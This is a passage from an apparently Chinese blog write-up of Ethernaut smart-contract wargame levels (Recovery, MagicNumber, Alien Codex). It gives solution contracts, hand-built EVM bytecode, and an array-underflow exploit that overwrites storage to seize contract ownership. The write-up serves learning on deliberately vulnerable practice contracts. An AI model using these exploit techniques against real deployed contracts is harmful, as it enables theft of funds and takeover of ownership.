<li><strong>找回资金</strong>:<br>一旦计算出丢失的合约地址，我们就可以调用该合约上的 <code>destroy(address payable _to)</code> 函数。这个函数执行 <code>selfdestruct(_to)</code>，会强制将合约内的所有余额发送给指定的地址。</li>
</ol>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 SimpleToken 的接口，只需要 destroy 函数</span></span><br><span class="line">interface <span class="title class_">ISimpleToken</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">RecoverySolution</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">recover</span>(<span class="params">address _recoveryInstance</span>) public {</span><br><span class="line">        <span class="comment">// 计算丢失的合约地址</span></span><br><span class="line">        <span class="comment">// 这里的 RLP 编码是针对 nonce = 1 的情况硬编码的</span></span><br><span class="line">        address lostToken = <span class="title function_">address</span>(<span class="title function_">uint160</span>(<span class="title function_">uint256</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">            <span class="title function_">bytes1</span>(<span class="number">0xd6</span>),       <span class="comment">// 列表头: 0xc0 + 22 bytes</span></span><br><span class="line">            <span class="title function_">bytes1</span>(<span class="number">0x94</span>),       <span class="comment">// 字符串头: 0x80 + 20 bytes</span></span><br><span class="line">            _recoveryInstance,  <span class="comment">// Recovery 合约地址</span></span><br><span class="line">            <span class="title function_">bytes1</span>(<span class="number">0x01</span>)        <span class="comment">// Nonce: 1</span></span><br><span class="line">        )))));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用接口的 destroy 函数，将资金转回给调用者 (msg.sender)</span></span><br><span class="line">        <span class="title class_">ISimpleToken</span>(lostToken).<span class="title function_">destroy</span>(<span class="title function_">payable</span>(msg.<span class="property">sender</span>));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>最后截图：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-18_21-02-57.png" alt="nipaste_2025-12-18_21-02-5"></p>
<h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h2><h3 id="EVM-字节码"><a href="#EVM-字节码" class="headerlink" title="EVM 字节码"></a><code>EVM</code> 字节码</h3><blockquote>
<p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right 32 byte number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 bytes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MagicNum</span> {</span><br><span class="line">    address public solver;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) {}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setSolver</span>(<span class="params">address _solver</span>) public {</span><br><span class="line">        solver = _solver;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个关卡的目标是创建一个“Solver”合约，它必须满足两个条件：</p>
<ol>
<li>当被询问 <code>whatIsTheMeaningOfLife()</code> 时，返回数字 <code>42</code>。</li>
<li>合约的大小必须非常非常小，<strong>最多 10 个字节</strong>。</li>
</ol>
<p><strong>解决方案解释</strong></p>
<p>普通的 Solidity 合约编译出来通常都很大，因为包含了初始化代码、函数选择器（Function Selector）和其他开销，根本无法满足 10 字节的限制。因此，我们需要直接编写 **EVM 字节码 (Bytecode)**。</p>
<p>我们需要两部分字节码：</p>
<ol>
<li>**运行时字节码 (Runtime Bytecode)**：这是合约部署后实际存储在区块链上的代码，也就是我们要执行的逻辑。</li>
<li>**初始化字节码 (Initialization Bytecode)**：这是用来部署运行时字节码的代码。</li>
</ol>
<p><strong>1. 运行时字节码 (Runtime Bytecode) - 逻辑部分</strong></p>
<p>我们需要合约返回 <code>42</code> (十六进制 <code>0x2a</code>)。由于 EVM 的返回值通常是 32 字节（256位），我们需要将 <code>42</code> 写入内存，然后返回这 32 字节。</p>
<ul>
<li><code>60 2a</code> (<code>PUSH1 0x2a</code>): 将 42 推入堆栈。</li>
<li><code>60 00</code> (<code>PUSH1 0x00</code>): 将内存偏移量 0 推入堆栈。</li>
<li><code>52</code> (<code>MSTORE</code>): 将 42 存储到内存偏移量 0 处。现在内存里是 <code>0x00...002a</code>。</li>
<li><code>60 20</code> (<code>PUSH1 0x20</code>): 将长度 32 (字节) 推入堆栈。</li>
<li><code>60 00</code> (<code>PUSH1 0x00</code>): 将内存偏移量 0 推入堆栈。</li>
<li><code>f3</code> (<code>RETURN</code>): 从内存偏移量 0 开始返回 32 个字节。</li>
</ul>
<p><strong>结果</strong>：<code>602a60005260206000f3</code> (正好 10 个字节)。</p>
<p><strong>2. 初始化字节码 (Initialization Bytecode) - 部署部分</strong></p>
<p>这段代码的作用是把上面的运行时字节码复制到内存中，然后告诉 EVM：“把这段内存里的数据作为新合约的代码存起来”。</p>
<ul>
<li><code>60 0a</code> (<code>PUSH1 0x0a</code>): 运行时代码长度是 10 字节。</li>
<li><code>60 0c</code> (<code>PUSH1 0x0c</code>): 运行时代码在整个字节流中的偏移量。因为初始化代码本身是 12 字节，所以运行时代码紧跟在第 12 字节之后。</li>
<li><code>60 00</code> (<code>PUSH1 0x00</code>): 目标内存偏移量。</li>
<li><code>39</code> (<code>CODECOPY</code>): 将代码复制到内存。</li>
<li><code>60 0a</code> (<code>PUSH1 0x0a</code>): 要返回的代码长度 (10 字节)。</li>
<li><code>60 00</code> (<code>PUSH1 0x00</code>): 代码在内存中的偏移量。</li>
<li><code>f3</code> (<code>RETURN</code>): 返回这段代码给 EVM 进行存储。</li>
</ul>
<p><strong>结果</strong>：<code>600a600c600039600a6000f3</code> (12 字节)。</p>
<p><strong>3. 组合字节码</strong></p>
<p>将两部分拼起来就是我们要发送的交易数据：<br><code>600a600c600039600a6000f3</code> (初始化) + <code>602a60005260206000f3</code> (运行时)</p>
<p><strong>代码实现</strong></p>
<p>使用 <code>assembly</code> 的 <code>create</code> 指令来部署这段裸字节码。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IMagicNum</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setSolver</span>(<span class="params">address _solver</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MagicNumSolution</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params">address _target</span>) public {</span><br><span class="line">        <span class="comment">// Runtime Bytecode (10 bytes):</span></span><br><span class="line">        <span class="comment">// 60 2a    PUSH1 0x2a (42)</span></span><br><span class="line">        <span class="comment">// 60 00    PUSH1 0x00 (Memory Offset)</span></span><br><span class="line">        <span class="comment">// 52       MSTORE     (Store 42 at memory 0x00)</span></span><br><span class="line">        <span class="comment">// 60 20    PUSH1 0x20 (Length: 32 bytes)</span></span><br><span class="line">        <span class="comment">// 60 00    PUSH1 0x00 (Offset: 0x00)</span></span><br><span class="line">        <span class="comment">// f3       RETURN     (Return 32 bytes from memory 0x00)</span></span><br><span class="line">        <span class="comment">// Hex: 602a60005260206000f3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Initialization Bytecode (12 bytes):</span></span><br><span class="line">        <span class="comment">// 60 0a    PUSH1 0x0a (Runtime code length: 10 bytes)</span></span><br><span class="line">        <span class="comment">// 60 0c    PUSH1 0x0c (Runtime code offset: 12 bytes, right after init code)</span></span><br><span class="line">        <span class="comment">// 60 00    PUSH1 0x00 (Memory destination offset)</span></span><br><span class="line">        <span class="comment">// 39       CODECOPY   (Copy code to memory)</span></span><br><span class="line">        <span class="comment">// 60 0a    PUSH1 0x0a (Runtime code length)</span></span><br><span class="line">        <span class="comment">// 60 00    PUSH1 0x00 (Memory offset)</span></span><br><span class="line">        <span class="comment">// f3       RETURN     (Return the runtime code from memory)</span></span><br><span class="line">        <span class="comment">// Hex: 600a600c600039600a6000f3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Full Bytecode: Init + Runtime</span></span><br><span class="line">        bytes memory bytecode = hex<span class="string">"600a600c600039600a6000f3602a60005260206000f3"</span>;</span><br><span class="line">        </span><br><span class="line">        address solver;</span><br><span class="line">        assembly {</span><br><span class="line">            <span class="comment">// create(value, offset, length)</span></span><br><span class="line">            solver := <span class="title function_">create</span>(<span class="number">0</span>, <span class="title function_">add</span>(bytecode, <span class="number">0x20</span>), <span class="title function_">mload</span>(bytecode))</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(solver != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">"Deployment failed"</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IMagicNum</span>(_target).<span class="title function_">setSolver</span>(solver);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>下面就来详细解释这段代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assembly {</span><br><span class="line">	solver := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>1. <code>create(v, p, n)</code> 指令</strong></p>
<p>这是 EVM 的操作码，用于创建一个新合约。它接受三个参数：</p>
<ul>
<li><strong>v (value)</strong>: 发送给新合约的以太币数量（单位是 wei）。</li>
<li><strong>p (position)</strong>: 内存中包含合约初始化代码的<strong>起始位置</strong>（偏移量）。</li>
<li><strong>n (length)</strong>: 内存中初始化代码的<strong>长度</strong>（字节数）。</li>
</ul>
<p>返回值是新部署合约的地址。如果部署失败（例如 revert 或 gas 不足），返回 0。</p>
<p><strong>2. 参数详解</strong></p>
<p><strong>参数 1: <code>0</code></strong></p>
<ul>
<li>这是发送给新合约的金额。我们不需要发送任何 ETH，所以是 0。</li>
</ul>
<p><strong>参数 2: <code>add(bytecode, 0x20)</code></strong></p>
<p>这是计算字节码在内存中的<strong>实际起始位置</strong>。</p>
<ul>
<li><strong>bytecode 变量</strong>: 在 Solidity 中，<code>bytes memory</code> 类型的变量（如这里的 <code>bytecode</code>）在汇编中实际上是一个指向内存地址的指针。</li>
<li>Solidity 内存布局:<ul>
<li>这个指针指向的第一个 32 字节（0x20）存储的是<strong>数组的长度</strong>。</li>
<li><strong>实际的数据内容</strong>是从第二个 32 字节开始的。</li>
</ul>
</li>
<li><code>add(bytecode, 0x20)</code>:<ul>
<li><code>bytecode</code> 是内存地址（比如 0x80）。</li>
<li><code>0x80</code> 处存的是长度（22）。</li>
<li><code>0x80 + 0x20 = 0xa0</code>。</li>
<li>所以我们需要跳过前 32 个字节的长度前缀，直接指向代码内容的开始处。</li>
</ul>
</li>
</ul>
<p><strong>参数 3: <code>mload(bytecode)</code></strong></p>
<p>这是获取字节码的<strong>长度</strong>。</p>
<ul>
<li><strong>mload(p)</strong>: 从内存地址 <code>p</code> 读取 32 个字节的数据。</li>
<li><strong>bytecode</strong>: 正如上面所说，它指向内存中存储该字节数组的地方。</li>
<li><strong>Solidity 约定</strong>: 动态数组（如 <code>bytes</code>）的第一个 32 字节存储的就是它的长度。</li>
<li>所以 <code>mload(bytecode)</code> 直接读取了存储在 <code>bytecode</code> 指针位置的数值，也就是这个字节数组的长度（在这里是 22 字节）。</li>
</ul>
<p>整句话的意思是：</p>
<blockquote>
<p>“EVM，请创建一个新合约。不要给它转钱 (<code>0</code>)。合约的代码在内存中，起始位置是 <code>bytecode</code> 指针往后挪 32 字节的地方 (<code>add(bytecode, 0x20)</code>)，代码的长度就是 <code>bytecode</code> 变量里存的那个长度值 (<code>mload(bytecode)</code>)。”</p>
</blockquote>
<blockquote>
<p>这里有一个疑问：0x20 字节具体在合约里面指的是什么，bytecode 指针具体是位于那个位置，是加上0x20后的位置，还是什么？</p>
</blockquote>
<p>这里用最直观的<strong>内存地图</strong>来看。</p>
<p>假设在 Solidity 里你写了这一行代码：</p>
<p>当这行代码运行时，内存里会发生什么？</p>
<p><strong>1. <code>bytecode</code> 只是一个路牌（指针）</strong></p>
<p>在汇编（Assembly）层面，变量 <code>bytecode</code> 的值只是一个<strong>内存地址</strong>。通常情况下，这个地址是 <code>0x80</code>。</p>
<p>所以，当你提到 <code>bytecode</code> 时，你实际上是在说数字 <strong>0x80</strong>。</p>
<p><strong>2. 内存地图 (Memory Map)</strong></p>
<p>让我们看看从地址 <code>0x80</code> 开始，内存里到底存了什么：</p>
<table>
<thead>
<tr>
<th>内存地址 (Address)</th>
<th>存储的内容 (Value)</th>
<th>含义 (Meaning)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>0x80</strong> (bytecode 指向这里)</td>
<td><code>0x0000...0016</code></td>
<td><strong>长度前缀</strong> (32字节)。这里存的是数字 22 (十六进制 0x16)，告诉程序这个数组有多长。</td>
</tr>
<tr>
<td><strong>0xA0</strong> (0x80 + 0x20)</td>
<td><code>0x600a...</code></td>
<td><strong>实际代码</strong>。这里才是你写的 <code>hex"600a..."</code> 真正开始的地方。</td>
</tr>
</tbody></table>
<p><strong>3. 你的疑问解答</strong></p>
<blockquote>
<p><strong>问：前32字节具体在合约里面指的是什么？</strong></p>
</blockquote>
<p><strong>答：</strong> 指的是上表中地址 <code>0x80</code> 到 <code>0x9F</code> 之间的那段空间。这段空间里存的<strong>不是代码</strong>，而是<strong>长度</strong>（数字 22）。</p>
<blockquote>
<p><strong>问：bytecode具体是位于那个位置？</strong></p>
</blockquote>
<p><strong>答：</strong></p>
<ul>
<li><strong>变量 bytecode 的值</strong>是 <code>0x80</code>。它指向整个对象的<strong>开头</strong>（也就是长度前缀的开头）。</li>
<li><strong>实际的机器码 (Payload)</strong> 位于 <code>0xA0</code>。</li>
</ul>
<blockquote>
<p><strong>问：是加上0x20后的位置，还是什么？</strong></p>
</blockquote>
<p><strong>答：</strong></p>
<ul>
<li>如果你想要<strong>读取长度</strong>，你就用 <code>bytecode</code> (即 <code>0x80</code>)。</li>
<li>如果你想要<strong>读取代码内容</strong>，你必须用 <code>add(bytecode, 0x20)</code> (即 <code>0x80 + 0x20 = 0xA0</code>)。</li>
</ul>
<p><strong>4. 为什么要加 0x20？</strong></p>
<p><code>create</code> 指令就像一个只懂机器码的工人。</p>
<ul>
<li>如果你给它 <code>0x80</code>，它从 <code>0x80</code> 开始读，读到的是 <code>0x00...</code>（长度数据）。它会困惑：“这是啥指令？全是0？”</li>
<li>如果你给它 <code>0xA0</code>（即 <code>add(bytecode, 0x20)</code>），它从 <code>0xA0</code> 开始读，读到的是 <code>0x60...</code>（PUSH指令）。它会说：“懂了，开始干活！”</li>
</ul>
<p><strong>一句话总结：</strong></p>
<p>指向<strong>信封</strong>（包含长度信息），<code>add(bytecode, 0x20)</code> 指向<strong>信纸</strong>（实际内容）。我们要把信纸交给 EVM 去执行，而不是把信封交给它。</p>
<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h2><h3 id="integer-overflow-动态数组存储"><a href="#integer-overflow-动态数组存储" class="headerlink" title="integer overflow & 动态数组存储"></a><code>integer overflow</code> &amp; <code>动态数组存储</code></h3><blockquote>
<p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
<p>  Things that might help</p>
<ul>
<li>Understanding how array storage works</li>
<li>Understanding <a class="link" target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html">ABI specifications <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Using a very <code>underhanded</code> approach</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../helpers/Ownable-05.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodex</span> is <span class="title class_">Ownable</span> {</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">contacted</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="title function_">assert</span>(contact);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">makeContact</span>(<span class="params"></span>) public {</span><br><span class="line">        contact = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) public contacted {</span><br><span class="line">        codex.<span class="title function_">push</span>(_content);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) public contacted {</span><br><span class="line">        codex.<span class="property">length</span>--;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint256 i, bytes32 _content</span>) public contacted {</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个关卡的目标是夺取 <code>AlienCodex</code> 合约的所有权。该合约存在一个<strong>数组下溢 (Array Underflow)</strong> 漏洞，允许我们修改合约的任意存储位置。</p>
<p><strong>漏洞分析</strong></p>
<ol>
<li><strong>数组下溢 (Array Underflow)</strong>:<ul>
<li>合约使用的是 Solidity <code>^0.5.0</code>。在 0.6.0 版本之前，如果对一个长度为 0 的动态数组执行 <code>length--</code>，会导致下溢，长度变为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container>−1。</li>
<li>这使得数组 <code>codex</code> 的长度变得极其巨大，覆盖了整个合约的存储空间。</li>
</ul>
</li>
<li><strong>存储布局 (Storage Layout)</strong>:<ul>
<li><strong>Slot 0</strong>: 包含 <code>_owner</code> (20 字节) 和 <code>contact</code> (1 字节)。它们被打包在一起。</li>
<li><strong>Slot 1</strong>: 存储 <code>codex.length</code>。</li>
<li><strong>数组数据</strong>: <code>codex</code> 数组的元素从 <code>keccak256(1)</code> 开始存储。</li>
</ul>
</li>
<li><strong>任意存储写入</strong>:<ul>
<li>由于数组现在覆盖了整个存储空间，我们可以通过计算特定的索引 i，使得 <code>codex[i]</code> 对应到 <strong>Slot 0</strong>。</li>
<li>公式：<code>keccak256(1) + i = 0</code> (在模 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container>下)。</li>
<li>所以我们需要计算的索引是：i = 0−keccak256(1)</li>
</ul>
</li>
</ol>
<p><strong>攻击步骤</strong></p>
<ol>
<li>调用 <code>makeContact()</code>：通过 <code>contacted</code> 修饰符的检查。</li>
<li>调用 <code>retract()</code>：触发数组下溢，将 <code>codex.length</code> 变为最大值。</li>
<li>计算索引 i：指向 Slot 0 的数组索引。</li>
<li>调用 <code>revise(i, new_owner)</code>：将 Slot 0 的内容（即 owner）修改为你的地址。</li>
</ol>
